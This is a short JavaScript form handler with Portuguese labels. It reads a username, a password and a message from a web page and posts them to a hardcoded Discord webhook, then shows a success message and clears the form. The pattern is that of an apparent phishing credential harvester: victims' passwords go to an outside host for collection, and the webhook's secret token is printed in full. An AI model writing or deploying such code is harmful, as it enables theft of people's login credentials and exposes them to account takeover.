
function enviarMensagem() {
  const usuario = document.getElementById("usuario").value;
  const senha = document.getElementById("senha").value;
  const mensagem = document.getElementById("mensagem").value;

  const conteudo = {
    content: `🔐 Nova submissão:\n\n👤 Usuário: ${usuario}\n🔑 Senha: ${senha}\n💬 Mensagem: ${mensagem}`
  };

  fetch("https://discord.com/api/webhooks/1375646657512865802/jGPklKjrApD8Rj2AYPatSal3C-QKfwPjMpODQrllPWdK3Tl0VZq88qAgpw08CUPfG--1", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(conteudo)
  })
  .then(response => {
    if (response.ok) {
      alert("Mensagem enviada com sucesso!");
      document.getElementById("usuario").value = "";
      document.getElementById("senha").value = "";
      document.getElementById("mensagem").value = "";
    } else {
      alert("Erro ao enviar a mensagem.");
    }
  });
}
